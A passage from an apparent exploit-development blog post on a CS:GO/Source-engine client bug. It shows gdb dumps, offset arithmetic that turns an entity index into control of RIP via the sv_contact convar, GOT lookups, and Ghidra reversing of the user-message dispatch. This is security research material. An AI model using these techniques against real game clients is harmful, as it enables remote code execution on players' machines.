	virtual int					GetFlags() const;
	virtual	bool				IsCommand( void ) const;

	// Install a change callback (there shouldn't already be one....)
	void InstallChangeCallback( FnChangeCallback_t callback, bool bInvoke = true );
	void RemoveChangeCallback( FnChangeCallback_t callbackToRemove );

	int GetChangeCallbackCount() const { return m_pParent->m_fnChangeCallbacks.Count(); }
	FnChangeCallback_t GetChangeCallback( int slot ) const { return m_pParent->m_fnChangeCallbacks[ slot ]; }

	// Retrieve value
	virtual float					GetFloat( void ) const;
	virtual int						GetInt( void ) const;
	FORCEINLINE_CVAR Color			GetColor( void ) const;
	FORCEINLINE_CVAR bool			GetBool() const {  return !!GetInt(); }
	FORCEINLINE_CVAR char const	   *GetString( void ) const;

	// Compiler driven selection for template use
	template <typename T> T Get( void ) const;
	template <typename T> T Get( T * ) const;

	// Any function that allocates/frees memory needs to be virtual or else you'll have crashes
	//  from alloc/free across dll/exe boundaries.
	
	// These just call into the IConCommandBaseAccessor to check flags and set the var (which ends up calling InternalSetValue).
	virtual void				SetValue( const char *value );
	virtual void				SetValue( float value );
	virtual void				SetValue( int value );
	virtual void				SetValue( Color value );
	
	// Reset to default value
	void						Revert( void );

	// True if it has a min/max setting
	bool						HasMin() const;
	bool						HasMax() const;

	bool						GetMin( float& minVal ) const;
	bool						GetMax( float& maxVal ) const;

	float						GetMinValue() const;
	float						GetMaxValue() const;

	const char					*GetDefault( void ) const;
	void						SetDefault( const char *pszDefault );

	// Value
	struct CVValue_t
	{
		char						*m_pszString;
		int							m_StringLength;

		// Values
		float						m_fValue;
		int							m_nValue;
	};

	FORCEINLINE_CVAR CVValue_t &GetRawValue()
	{
		return m_Value;
	}
	FORCEINLINE_CVAR const CVValue_t &GetRawValue() const
	{
		return m_Value;
	}

private:
	bool						InternalSetColorFromString( const char *value );
	// Called by CCvar when the value of a var is changing.
	virtual void				InternalSetValue(const char *value);
	// For CVARs marked FCVAR_NEVER_AS_STRING
	virtual void				InternalSetFloatValue( float fNewValue );
	virtual void				InternalSetIntValue( int nValue );
	virtual void				InternalSetColorValue( Color value );

	virtual bool				ClampValue( float& value );
	virtual void				ChangeStringValue( const char *tempVal, float flOldValue );

	virtual void				Create( const char *pName, const char *pDefaultValue, int flags = 0,
									const char *pHelpString = 0, bool bMin = false, float fMin = 0.0,
									bool bMax = false, float fMax = false, FnChangeCallback_t callback = 0 );

	// Used internally by OneTimeInit to initialize.
	virtual void				Init();

protected:

	// This either points to "this" or it points to the original declaration of a ConVar.
	// This allows ConVars to exist in separate modules, and they all use the first one to be declared.
	// m_pParent->m_pParent must equal m_pParent (ie: m_pParent must be the root, or original, ConVar).
	ConVar						*m_pParent;

	// Static data
	const char					*m_pszDefaultValue;
	
	CVValue_t					m_Value;

	// Min/Max values
	bool						m_bHasMin;
	float						m_fMinVal;
	bool						m_bHasMax;
	float						m_fMaxVal;
	
	// Call this function when ConVar changes
	CUtlVector< FnChangeCallback_t > m_fnChangeCallbacks;
};



```
{% endraw %}

When looking at the memory in gdb we get this:

{% raw %}
```
(gdb) x/10wx &sv_contact 
0x7fffe651e600 <_ZL10sv_contact>:	0xe62c30c8	0x00007fff	0xe651e560	0x00007fff
0x7fffe651e610 <_ZL10sv_contact+16>:	0x00000001	0x00000000	0xe606fe1f	0x00007fff
0x7fffe651e620 <_ZL10sv_contact+32>:	0xe606f050	0x00007fff
(gdb) x/10wx 0x7fffe651e560
0x7fffe651e560 <_ZL19sv_cacheencodedents>:	0xe62c30c8	0x00007fff	0xe64e9300	0x00007fff
0x7fffe651e570 <_ZL19sv_cacheencodedents+16>:	0x00000001	0x00000000	0xe606fe2a	0x00007fff
0x7fffe651e580 <_ZL19sv_cacheencodedents+32>:	0xe606f070	0x00007fff
(gdb) x/10wx 0x7fffe606fe1f
0x7fffe606fe1f:	0x635f7673	0x61746e6f	0x73007463	0x61635f76
0x7fffe606fe2f:	0x65656863	0x646f636e	0x6e656465	0x76007374
0x7fffe606fe3f:	0x69647561	0x65635f6f
(gdb) x/10s 0x7fffe606fe1f
0x7fffe606fe1f:	"sv_contact"
0x7fffe606fe2a:	"sv_cacheencodedents"
0x7fffe606fe3e:	"vaudio_celt"
0x7fffe606fe4a:	"sv_voicecodec"
0x7fffe606fe58:	"sv_voiceenable"
0x7fffe606fe67:	"sv_downloadurl"
0x7fffe606fe76:	"sv_consistency"
0x7fffe606fe85:	"sv_maxreplay"
0x7fffe606fe92:	"sv_mincmdrate"
0x7fffe606fea0:	"sv_maxcmdrate"
(gdb) 


```
{% endraw %}

Here we can see the default value (1) in memory. therefore in this case 0x7fffe606fe2a is the m_value which is of type CVValue_t . I actually think that sv_contact is a much better candidate because it is the contact email address.


Ok so the attack plan is this:




Calculate the offset into the sv_contact with the 

{% raw %}
```
mov    rdi,QWORD PTR [rdi+rsi*1+0x8]
```
{% endraw %}

instruction. This function then returns this value which should point to the value of the console variable called sv_contact .

{% raw %}
```
inline IClientUnknown* CClientEntityList::GetListedEntity( int entnum )
{
	IHandleEntity* pHandle = LookupEntityByNetworkIndex( entnum );
	return static_cast< IClientUnknown* >( pHandle );
}

```
{% endraw %}
This function then returns the address of the value of our con message.

After that

{% raw %}
```
C_BaseEntity* CClientEntityList::GetBaseEntity( int entnum )
{
	IClientUnknown *pEnt = GetListedEntity( entnum );
	return pEnt ? pEnt->GetBaseEntity() : 0;
}


```
{% endraw %}

We then call a method on this "object". Because the address points to the convar value, then we can control RIP! :)

Let's try our hypothesis:

First calculate the appropriate value for entity index:

`[rdi+rsi*1+0x8]` aka the offset is 0x1aedcec8 so rsi*1+8 == 0x1aedcec8  and because rsi = shl rsi,0x5 so (x<<5)+8 = 0x1aedcec8


just use quick algebra and you get this:

32*x+8 = 0x1aedcec8 = 451792584
32*x+8 = 451792584

32*x = 451792584-8
x= (451792584-8)/32

{% raw %}
```
14118518.0
>>> (451792584-8) % 32
0
>>> 

```
{% endraw %}

And look at that! Our luck is good because in our compiled version the offset-8 is a multiple of 32, which means that we can use this!

Lets

{% raw %}
```
>>> (451792584-8)/32
14118518.0


```
{% endraw %}

Set our entity index to 14118518 and see what happens!



0x7fffee41d648

0x7fffcb641780+0x1aedcec0

m_Value : 0x7fffee41d648


EntityList: 0x7fffcb641780


After running we get this:

{% raw %}
```
Thread 1 "csgo_linux64" received signal SIGSEGV, Segmentation fault.
0x00007fffca81a84c in CClientEntityList::GetBaseEntity (this=<optimized out>, entnum=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/client/cliententitylist.cpp:196
196		return pEnt ? pEnt->GetBaseEntity() : 0;
(gdb) x/10i $rip
=> 0x7fffca81a84c <CClientEntityList::GetBaseEntity(int)+28>:	jmp    QWORD PTR [rax+0x40]
   0x7fffca81a84f <CClientEntityList::GetBaseEntity(int)+31>:	nop
   0x7fffca81a850 <CClientEntityList::GetBaseEntity(int)+32>:	xor    eax,eax
   0x7fffca81a852 <CClientEntityList::GetBaseEntity(int)+34>:	ret    
   0x7fffca81a853:	nop
   0x7fffca81a854:	data16 nop WORD PTR cs:[rax+rax*1+0x0]
   0x7fffca81a85f:	nop
   0x7fffca81a860 <CClientEntityList::GetCollideable(int)>:	endbr64 
   0x7fffca81a864 <CClientEntityList::GetCollideable(int)+4>:	test   esi,esi
   0x7fffca81a866 <CClientEntityList::GetCollideable(int)+6>:	js     0x7fffca81a880 <CClientEntityList::GetCollideable(int)+32>
(gdb) i r
rax            0x4141414141414141  4702111234474983745
rbx            0x7fffcbeca9c0      140736614672832
rcx            0x1                 1
rdx            0x7fffcac7c6c0      140736595478208
rsi            0x1aedcec0          451792576
rdi            0x555556c6e3a0      93825016456096
rbp            0xc2                0xc2
rsp            0x7ffffffbcec8      0x7ffffffbcec8
r8             0xd76e76            14118518
r9             0x7fffe5b77030      140737047392304
r10            0x18                24
r11            0x100000000         4294967296
r12            0x7ffffffbcedc      140737488080604
r13            0x555571b77110      93825468428560
r14            0x0                 0
r15            0x7fffcb409678      140736603395704
rip            0x7fffca81a84c      0x7fffca81a84c <CClientEntityList::GetBaseEntity(int)+28>
eflags         0x210206            [ PF IF RF ID ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) 

```
{% endraw %}

Lets try to call printf with this real quick using the global offset table:


{% raw %}
```


000000df9668  1f7300000007 R_X86_64_JUMP_SLO 00000000007adeb0 _ZNSt6vectorIN8CryptoP + 0
000000df9670  0b8000000007 R_X86_64_JUMP_SLO 00000000007d39f0 _ZN8CryptoPP22Additive + 0
000000df9678  028e00000007 R_X86_64_JUMP_SLO 0000000000aa3f10 _ZNSt8_Rb_treeISsSt4pa + 0
000000df9680  004600000007 R_X86_64_JUMP_SLO 0000000000000000 _ZN12CThreadEventC1Eb + 0
000000df9688  0e7100000007 R_X86_64_JUMP_SLO 0000000000a84020 _ZNSt8_Rb_treeIiSt4pai + 0
000000df9690  023d00000007 R_X86_64_JUMP_SLO 00000000008d22a0 _ZN8CryptoPP18Standard + 0
000000df9698  004700000007 R_X86_64_JUMP_SLO 0000000000000000 fprintf@GLIBC_2.2.5 + 0
000000df96a0  212b00000007 R_X86_64_JUMP_SLO 00000000007c52f0 _ZN8CryptoPP12WindowSl + 0
000000df96a8  215d00000007 R_X86_64_JUMP_SLO 000000000080a9e0 _ZNK8CryptoPP4EC2N14BE + 0
000000df96b0  108f00000007 R_X86_64_JUMP_SLO 0000000000a2f341 jpeg_write_scanlines + 0
000000df96b8  103700000007 R_X86_64_JUMP_SLO 00000000007e1050 _ZNSt6vectorIN8CryptoP + 0
000000df96c0  004800000007 R_X86_64_JUMP_SLO 0000000000000000 _ZN9CVProfileC2Ev + 0
000000df96c8  0cdb00000007 R_X86_64_JUMP_SLO 000000000089a4a0 _ZNK8CryptoPP11RSAFunc + 0
000000df96d0  004900000007 R_X86_64_JUMP_SLO 0000000000000000 pthread_setspecific@GLIBC_2.2.5 + 0


```
{% endraw %}

The engine_client.so base address is this:


{% raw %}
```
(gdb) info shared engine_client
From                To                  Syms Read   Shared Object Library
0x00007fffe5882c90  0x00007fffe604d6af  Yes         /home/cyberhacker/Netpacketfuzzer/game/bin/linux64/engine_client.so
(gdb) 

```
{% endraw %}


0x00007fffe5882c90+0xdf9698


actually lets call snprintf instead:

{% raw %}
```
(gdb) x/300wx &_GLOBAL_OFFSET_TABLE_ 
0x7fff5c9c1000:	0x00006da0	0x00000000	0x00000000	0x00000000
0x7fff5c9c1010:	0x00000000	0x00000000	0xf63dbaf0	0x00007fff
0x7fff5c9c1020 <free@got.plt>:	0xf7e386d0	0x00007fff	0xf7f230a0	0x00007fff
0x7fff5c9c1030 <abort@got.plt>:	0xf7dc072e	0x00007fff	0xf63db140	0x00007fff
0x7fff5c9c1040 <__res_context_query@got.plt>:	0xf63d5aa0	0x00007fff	0xf7e4fbc0	0x00007fff
0x7fff5c9c1050 <__stack_chk_fail@got.plt>:	0xf7ecda70	0x00007fff	0xf7e4f480	0x00007fff
0x7fff5c9c1060 <__res_context_hostalias@got.plt>:	0xf63d65d0	0x00007fff	0xf7e59ad0	0x00007fff
0x7fff5c9c1070 <_nss_dns_gethostbyname3_r@got.plt>:	0x5c9bce30	0x00007fff	0xf7edf4f0	0x00007fff
0x7fff5c9c1080 <__ns_get16@got.plt>:	0xf63dbae0	0x00007fff	0xf7edfa00	0x00007fff
0x7fff5c9c1090 <__dn_skipname@got.plt>:	0xf63d2830	0x00007fff	0xf63d27f0	0x00007fff
0x7fff5c9c10a0 <sprintf@got.plt>:	0xf7dffe20	0x00007fff	0xf63d6790	0x00007fff
0x7fff5c9c10b0 <__ctype_tolower_loc@got.plt>:	0xf7dd24e0	0x00007fff	0xf7dd24a0	0x00007fff
0x7fff5c9c10c0 <__ns_name_ntop@got.plt>:	0xf63dac10	0x00007fff	0x5c9c10c8	0x00007fff
0x7fff5c9c10d0 <completed.8061>:	0x00000000	0x00000000	0x65386162	0x38333938


```
{% endraw %}

0x7fff5c9c10a0

0x7fff5c9c10a0-0x40=


Actually, fuck that. Lets implement this crash on the actual client instead to see if they patched it.

The guys in the previous blog post which I mentioned actually published their exploit publically, with all the server initialization and stuff, so now we can play around with the actual client instead of our compiled version. Of course we lose a shitton of context, because there aren't any debugging symbols etc etc, but I think that it is possible. After this we most likely will need to find an info leak bug which we could abuse in order to find out the address of all of the stuff. But one step at a time.

Now when running with the exploit server the actual client (the newer version) hangs when waiting for the client. I don't know why that is so lets try to investigate:

First suspect may be the checksum check, so I guess we should also check that before going forward. Just compile our client with the checksums enabled????

Ok I compiled the shit with checksums enabled. Now my next suspicion is that the bug is actually fixed already :( .

One way to know if we actually call the reload thing is to see if the usermessage gets triggered. One way to do that is to purposefully send an invalid user message with invalid message index... oh wait. Looking at the code there is this cl_show_usermessage option which as the name suggests shows user messages. Welp. That was easy. Except that it wasn't. Grepping for this string it appears that they removed this option! Fuck! :(

sv_show_usermessage shows up in the engine_client.so in the bin/ dir but not in the linux64 dir . Maybe we can play normally on the local server and get some messages that way and then grep for that, but that really doesn't help us that much, except that we can see if the Reload stuff is ther maybe??? Lets try it!


sv_show_usermessage

The command does not even work in the bullshit poopoo.

here is the reversed function SVCMsg_UserMessage:

{% raw %}
```

undefined4 FUN_0066d780(undefined8 param_1,long param_2)

{
  undefined4 uVar1;
  
  uVar1 = (**(code **)(*DAT_00f11130 + 0x130))
                    (DAT_00f11130,*(undefined4 *)(param_2 + 0x18),*(undefined4 *)(param_2 + 0x1c),
                     *(undefined8 *)(**(long **)(param_2 + 0x10) + -0x18));
  if ((char)uVar1 == '\0') {
    _Z6ConMsgPKcz(&DAT_00a7ed08,*(undefined4 *)(param_2 + 0x18));
  }
  return uVar1;
}

```
{% endraw %}

disassembly:

{% raw %}
```

                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_0066d780()
             undefined         AL:1           <RETURN>
                             FUN_0066d780                                    XREF[2]:     00ade6e4, 00b854b0(*)  
        0066d780 48 8d 05        LEA        RAX,[DAT_00f11130]                               = ??
                 a9 39 8a 00
        0066d787 55              PUSH       RBP
        0066d788 48 89 e5        MOV        RBP,RSP
        0066d78b 41 54           PUSH       R12
        0066d78d 53              PUSH       RBX
        0066d78e 48 89 f3        MOV        RBX,RSI
        0066d791 8b 56 1c        MOV        EDX,dword ptr [RSI + 0x1c]
        0066d794 48 8b 38        MOV        RDI,qword ptr [RAX]=>DAT_00f11130                = ??
        0066d797 48 8b 46 10     MOV        RAX,qword ptr [RSI + 0x10]
        0066d79b 8b 76 18        MOV        ESI,dword ptr [RSI + 0x18]
        0066d79e 4c 8b 00        MOV        R8,qword ptr [RAX]
        0066d7a1 48 8b 07        MOV        RAX,qword ptr [RDI]
        0066d7a4 49 8b 48 e8     MOV        RCX,qword ptr [R8 + -0x18]
        0066d7a8 ff 90 30        CALL       qword ptr [RAX + 0x130]
                 01 00 00
        0066d7ae 84 c0           TEST       AL,AL
        0066d7b0 41 89 c4        MOV        R12D,EAX
        0066d7b3 75 11           JNZ        LAB_0066d7c6
        0066d7b5 8b 73 18        MOV        ESI,dword ptr [RBX + 0x18]
        0066d7b8 48 8d 3d        LEA        RDI,[DAT_00a7ed08]                               = 43h    C
                 49 15 41 00
        0066d7bf 31 c0           XOR        EAX,EAX
        0066d7c1 e8 d2 54        CALL       _Z6ConMsgPKcz                                    undefined _Z6ConMsgPKcz()
                 c4 ff
                             LAB_0066d7c6                                    XREF[1]:     0066d7b3(j)  
        0066d7c6 44 89 e0        MOV        EAX,R12D
        0066d7c9 5b              POP        RBX
        0066d7ca 41 5c           POP        R12
        0066d7cc 5d              POP        RBP
        0066d7cd c3              RET



```
{% endraw %}


DAT_00f11130 is the g_ClientDLL and the DispatchUserMessage is at offset 0x130 from that.

Lets try to patch that stuff such that it always prints that Couldn't dispatch user message thing such that we get the user message type even though it is perfectly valid.

Lets do the patching of the thing maybe?


After patching the binary now we can see when a usermessage goes through!

{% raw %}
```

DispatchAsyncEvent backlog, failed to dispatch all this frame. 111 of 121 remaining
DispatchAsyncEvent backlog, failed to dispatch all this frame. 178 of 2923 remaining
DispatchAsyncEvent backlog, failed to dispatch all this frame. 81 of 2593 remaining
DispatchAsyncEvent backlog, failed to dispatch all this frame. 177 of 2923 remaining
Couldn't dispatch user message (26)

```
{% endraw %}

Note that now the dispatch message error is actually no longer valid. It is just there to signify that the message went through. Because that error message did not occur previously then we know that the usermessage number 26 is atleast a valid message id. Lets break on that function in gdb and see what happens:

{% raw %}
```
(*): Shared library is missing debugging information.
(gdb) find /b 0x00007fffed226ce0 0x00007fffed9a3400 84 c0 41 89 c4 90 90
A syntax error in expression, near `0x00007fffed9a3400 84 c0 41 89 c4 90 90'.
(gdb) find /b 0x00007fffed226ce0 0x00007fffed9a3400 84, c0, 41, 89, c4, 90, 90
A syntax error in expression, near `0x00007fffed9a3400 84, c0, 41, 89, c4, 90, 90'.
(gdb) find /b 0x00007fffed226ce0 0x00007fffed9a3400 0x84, 0xc0, 0x41, 0x89, 0xc4, 0x90, 0x90
A syntax error in expression, near `0x00007fffed9a3400 0x84, 0xc0, 0x41, 0x89, 0xc4, 0x90, 0x90'.
(gdb) find /b 0x00007fffed226ce0, 0x00007fffed9a3400 0x84, 0xc0, 0x41, 0x89, 0xc4, 0x90, 0x90
A syntax error in expression, near `0x84, 0xc0, 0x41, 0x89, 0xc4, 0x90, 0x90'.
(gdb) find /b 0x00007fffed226ce0, 0x00007fffed9a3400, 0x84, 0xc0, 0x41, 0x89, 0xc4, 0x90, 0x90
0x7fffed5e17ae
1 pattern found.
(gdb) x/10i 0x7fffed5e17ae
   0x7fffed5e17ae:	test   al,al
   0x7fffed5e17b0:	mov    r12d,eax
   0x7fffed5e17b3:	nop
   0x7fffed5e17b4:	nop
   0x7fffed5e17b5:	mov    esi,DWORD PTR [rbx+0x18]
   0x7fffed5e17b8:	lea    rdi,[rip+0x411549]        # 0x7fffed9f2d08
   0x7fffed5e17bf:	xor    eax,eax
   0x7fffed5e17c1:	call   0x7fffed226c98 <_Z6ConMsgPKcz@plt>
   0x7fffed5e17c6:	mov    eax,r12d
   0x7fffed5e17c9:	pop    rbx
(gdb) 

```
{% endraw %}

Just set a breakpoint in that function and see what happens? `   0x7fffed5e17a8:	call   QWORD PTR [rax+0x130]` <---here

{% raw %}
```
Thread 1 "csgo_linux64" hit Breakpoint 2, 0x00007fffed5e17a8 in ?? ()
(gdb) where
#0  0x00007fffed5e17a8 in ?? ()
#1  0x0000000040981000 in ?? ()
#2  0x0000000045d602d0 in ?? ()
#3  0x00007fffffffc840 in ?? ()
#4  0x00007fffed521381 in ?? ()
#5  0x00007fffffffc600 in ?? ()
#6  0x00007fffffffc780 in ?? ()
#7  0x00007fffffffc788 in ?? ()
#8  0x0000000000000060 in ?? ()
#9  0x00007fffffffc7a8 in ?? ()
#10 0x00007fffffffc7a0 in ?? ()
#11 0x000000000000001c in ?? ()
#12 0x0000000000000000 in ?? ()
(gdb) x/10i $rip
=> 0x7fffed5e17a8:	call   QWORD PTR [rax+0x130]
   0x7fffed5e17ae:	test   al,al
   0x7fffed5e17b0:	mov    r12d,eax
   0x7fffed5e17b3:	nop
   0x7fffed5e17b4:	nop
   0x7fffed5e17b5:	mov    esi,DWORD PTR [rbx+0x18]
   0x7fffed5e17b8:	lea    rdi,[rip+0x411549]        # 0x7fffed9f2d08
   0x7fffed5e17bf:	xor    eax,eax
   0x7fffed5e17c1:	call   0x7fffed226c98
   0x7fffed5e17c6:	mov    eax,r12d
(gdb) si
0x00007fffd7486410 in ?? ()
(gdb) x/10i $rip
=> 0x7fffd7486410:	push   rbp
   0x7fffd7486411:	mov    rbp,rsp
   0x7fffd7486414:	push   r13
   0x7fffd7486416:	mov    r13d,ecx
   0x7fffd7486419:	push   r12
   0x7fffd748641b:	mov    r12d,edx
   0x7fffd748641e:	push   rbx
   0x7fffd748641f:	mov    ebx,esi
   0x7fffd7486421:	sub    rsp,0x18
   0x7fffd7486425:	mov    QWORD PTR [rbp-0x28],r8
(gdb) x/10wx $rip
0x7fffd7486410:	0xe5894855	0x89415541	0x415441cd	0x8953d489
0x7fffd7486420:	0xec8348f3	0x45894c18	0xf1f2e8d8	0x8b4c0019
0x7fffd7486430:	0x8348d845	0x894418c4
(gdb) x/30b $rip
0x7fffd7486410:	0x55	0x48	0x89	0xe5	0x41	0x55	0x41	0x89
0x7fffd7486418:	0xcd	0x41	0x54	0x41	0x89	0xd4	0x53	0x89
0x7fffd7486420:	0xf3	0x48	0x83	0xec	0x18	0x4c	0x89	0x45
0x7fffd7486428:	0xd8	0xe8	0xf2	0xf1	0x19	0x00
(gdb) 

```
{% endraw %}

as we can see here:

{% raw %}
```
(gdb) x/200i $rip
=> 0x7fffd7486410:	push   rbp
   0x7fffd7486411:	mov    rbp,rsp
   0x7fffd7486414:	push   r13
   0x7fffd7486416:	mov    r13d,ecx
   0x7fffd7486419:	push   r12
   0x7fffd748641b:	mov    r12d,edx
   0x7fffd748641e:	push   rbx
   0x7fffd748641f:	mov    ebx,esi
   0x7fffd7486421:	sub    rsp,0x18
   0x7fffd7486425:	mov    QWORD PTR [rbp-0x28],r8
   0x7fffd7486429:	call   0x7fffd7625620
   0x7fffd748642e:	mov    r8,QWORD PTR [rbp-0x28]
   0x7fffd7486432:	add    rsp,0x18
   0x7fffd7486436:	mov    ecx,r13d
   0x7fffd7486439:	mov    edx,r12d
   0x7fffd748643c:	mov    esi,ebx
   0x7fffd748643e:	pop    rbx
   0x7fffd748643f:	mov    rdi,rax
   0x7fffd7486442:	pop    r12
   0x7fffd7486444:	pop    r13
   0x7fffd7486446:	pop    rbp
   0x7fffd7486447:	jmp    0x7fffd7624cb0
```
{% endraw %}



this corresponds to the 

{% raw %}
```
bool CHLClient::DispatchUserMessage( int msg_type, int32 nPassthroughFlags, int size, const void *msg )
{
	return UserMessages()->DispatchUserMessage( msg_type, nPassthroughFlags, size, msg );
}


```
{% endraw %}


which in ghidra is this:

{% raw %}
```

                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_0084d890()
             undefined         AL:1           <RETURN>
                             FUN_0084d890                                    XREF[3]:     FUN_008add70:008ade7b(c), 
                                                                                          00aed8fc, 00bd4a88(*)  
        0084d890 55              PUSH       RBP
        0084d891 48 89 e5        MOV        RBP,RSP
        0084d894 41 55           PUSH       R13
        0084d896 41 89 cd        MOV        R13D,ECX
        0084d899 41 54           PUSH       R12
        0084d89b 41 89 d4        MOV        R12D,EDX
        0084d89e 53              PUSH       RBX
        0084d89f 48 89 f3        MOV        RBX,RSI
        0084d8a2 48 83 ec 08     SUB        RSP,0x8
        0084d8a6 e8 f5 fc        CALL       FUN_0084d5a0                                     undefined FUN_0084d5a0()
                 ff ff
        0084d8ab 84 c0           TEST       AL,AL
        0084d8ad 75 11           JNZ        LAB_0084d8c0
        0084d8af 48 83 c4 08     ADD        RSP,0x8
        0084d8b3 31 c0           XOR        EAX,EAX
        0084d8b5 5b              POP        RBX
        0084d8b6 41 5c           POP        R12
        0084d8b8 41 5d           POP        R13
        0084d8ba 5d              POP        RBP
        0084d8bb c3              RET


```
{% endraw %}




Section I think.



{% raw %}
```
(gdb) breakpoint 0x7fffd7486429
Undefined command: "breakpoint".  Try "help".
(gdb) break *0x7fffd7486429
Breakpoint 3 at 0x7fffd7486429
(gdb) c
Continuing.

Thread 1 "csgo_linux64" hit Breakpoint 3, 0x00007fffd7486429 in ?? ()
(gdb) x/10i $rip
=> 0x7fffd7486429:	call   0x7fffd7625620
   0x7fffd748642e:	mov    r8,QWORD PTR [rbp-0x28]
   0x7fffd7486432:	add    rsp,0x18
   0x7fffd7486436:	mov    ecx,r13d
   0x7fffd7486439:	mov    edx,r12d
   0x7fffd748643c:	mov    esi,ebx
   0x7fffd748643e:	pop    rbx
   0x7fffd748643f:	mov    rdi,rax
   0x7fffd7486442:	pop    r12
   0x7fffd7486444:	pop    r13
(gdb) si
0x00007fffd7625620 in ?? ()
(gdb) x/10i $rip
=> 0x7fffd7625620:	cmp    BYTE PTR [rip+0x21e9e01],0x0        # 0x7fffd980f428
   0x7fffd7625627:	je     0x7fffd7625638
   0x7fffd7625629:	lea    rax,[rip+0x21e9dd0]        # 0x7fffd980f400
   0x7fffd7625630:	ret    
   0x7fffd7625631:	nop    DWORD PTR [rax+0x0]
   0x7fffd7625638:	push   rbp
   0x7fffd7625639:	lea    rdi,[rip+0x21e9de8]        # 0x7fffd980f428
   0x7fffd7625640:	mov    rbp,rsp
   0x7fffd7625643:	call   0x7fffd729f8a0
   0x7fffd7625648:	test   eax,eax
(gdb) x/100i $rip
=> 0x7fffd7625620:	cmp    BYTE PTR [rip+0x21e9e01],0x0        # 0x7fffd980f428
   0x7fffd7625627:	je     0x7fffd7625638
   0x7fffd7625629:	lea    rax,[rip+0x21e9dd0]        # 0x7fffd980f400
   0x7fffd7625630:	ret    
   0x7fffd7625631:	nop    DWORD PTR [rax+0x0]
   0x7fffd7625638:	push   rbp
   0x7fffd7625639:	lea    rdi,[rip+0x21e9de8]        # 0x7fffd980f428
   0x7fffd7625640:	mov    rbp,rsp
   0x7fffd7625643:	call   0x7fffd729f8a0
   0x7fffd7625648:	test   eax,eax
   0x7fffd762564a:	je     0x7fffd76256db
   0x7fffd7625650:	mov    eax,0xffffffff
   0x7fffd7625655:	xor    edx,edx
   0x7fffd7625657:	mov    esi,0xffffffff
   0x7fffd762565c:	mov    QWORD PTR [rip+0x21e9da1],0x0        # 0x7fffd980f408
   0x7fffd7625667:	mov    WORD PTR [rip+0x21e9daa],ax        # 0x7fffd980f418
   0x7fffd762566e:	mov    ecx,0xffffffff
   0x7fffd7625673:	lea    rax,[rip+0xffffffffffd32576]        # 0x7fffd7357bf0
   0x7fffd762567a:	mov    WORD PTR [rip+0x21e9d99],dx        # 0x7fffd980f41a
   0x7fffd7625681:	lea    rdi,[rip+0x21e9da0]        # 0x7fffd980f428
   0x7fffd7625688:	mov    WORD PTR [rip+0x21e9d8f],si        # 0x7fffd980f41e
   0x7fffd762568f:	mov    DWORD PTR [rip+0x21e9d77],0x0        # 0x7fffd980f410
   0x7fffd7625699:	mov    DWORD PTR [rip+0x21e9d71],0x0        # 0x7fffd980f414
   0x7fffd76256a3:	mov    WORD PTR [rip+0x21e9d72],cx        # 0x7fffd980f41c
   0x7fffd76256aa:	mov    QWORD PTR [rip+0x21e9d6b],0x0        # 0x7fffd980f420
   0x7fffd76256b5:	mov    QWORD PTR [rip+0x21e9d44],rax        # 0x7fffd980f400
   0x7fffd76256bc:	call   0x7fffd72a0fa0
   0x7fffd76256c1:	lea    rdx,[rip+0x1895a18]        # 0x7fffd8ebb0e0
   0x7fffd76256c8:	lea    rsi,[rip+0x21e9d31]        # 0x7fffd980f400
   0x7fffd76256cf:	lea    rdi,[rip+0x1a]        # 0x7fffd76256f0
   0x7fffd76256d6:	call   0x7fffd729fa70
   0x7fffd76256db:	lea    rax,[rip+0x21e9d1e]        # 0x7fffd980f400
   0x7fffd76256e2:	pop    rbp
   0x7fffd76256e3:	ret    
   0x7fffd76256e4:	data16 data16 nop WORD PTR cs:[rax+rax*1+0x0]
   0x7fffd76256f0:	push   rbp
   0x7fffd76256f1:	mov    rbp,rsp
   0x7fffd76256f4:	push   rbx
   0x7fffd76256f5:	mov    rbx,rdi
   0x7fffd76256f8:	sub    rsp,0x8
   0x7fffd76256fc:	call   0x7fffd7625fd0
   0x7fffd7625701:	mov    rdi,rbx
   0x7fffd7625704:	call   0x7fffd7625fd0
   0x7fffd7625709:	mov    eax,DWORD PTR [rbx+0x14]
   0x7fffd762570c:	test   eax,eax
   0x7fffd762570e:	js     0x7fffd7625738
   0x7fffd7625710:	mov    rsi,QWORD PTR [rbx+0x8]
   0x7fffd7625714:	test   rsi,rsi
   0x7fffd7625717:	je     0x7fffd7625738
   0x7fffd7625719:	mov    rax,QWORD PTR [rip+0x18947a0]        # 0x7fffd8eb9ec0
   0x7fffd7625720:	mov    rdi,QWORD PTR [rax]
   0x7fffd7625723:	mov    rax,QWORD PTR [rdi]
   0x7fffd7625726:	mov    rax,QWORD PTR [rax+0x10]
   0x7fffd762572a:	add    rsp,0x8
   0x7fffd762572e:	pop    rbx
   0x7fffd762572f:	pop    rbp
   0x7fffd7625730:	jmp    rax
   0x7fffd7625732:	nop    WORD PTR [rax+rax*1+0x0]
   0x7fffd7625738:	add    rsp,0x8
   0x7fffd762573c:	pop    rbx
   0x7fffd762573d:	pop    rbp
   0x7fffd762573e:	ret    
   0x7fffd762573f:	nop
   0x7fffd7625740:	push   rbp
   0x7fffd7625741:	mov    rbp,rsp
   0x7fffd7625744:	push   r15
   0x7fffd7625746:	push   r14
   0x7fffd7625748:	push   r13
   0x7fffd762574a:	push   r12
   0x7fffd762574c:	push   rbx
   0x7fffd762574d:	sub    rsp,0x68
   0x7fffd7625751:	mov    QWORD PTR [rbp-0x88],rsi
   0x7fffd7625758:	mov    rdx,QWORD PTR fs:0x28
   0x7fffd7625761:	mov    QWORD PTR [rbp-0x38],rdx
   0x7fffd7625765:	xor    edx,edx
   0x7fffd7625767:	test   rsi,rsi
   0x7fffd762576a:	je     0x7fffd76258ff
   0x7fffd7625770:	mov    rax,QWORD PTR [rsi]
   0x7fffd7625773:	lea    r14,[rbp-0x80]
   0x7fffd7625777:	mov    r13,rdi
   0x7fffd762577a:	mov    rdi,rsi
   0x7fffd762577d:	xor    ebx,ebx
   0x7fffd762577f:	call   QWORD PTR [rax+0x10]
   0x7fffd7625782:	movzx  r12d,WORD PTR [r13+0x18]
   0x7fffd7625787:	mov    DWORD PTR [rbp-0x48],0x0
   0x7fffd762578e:	mov    edx,eax
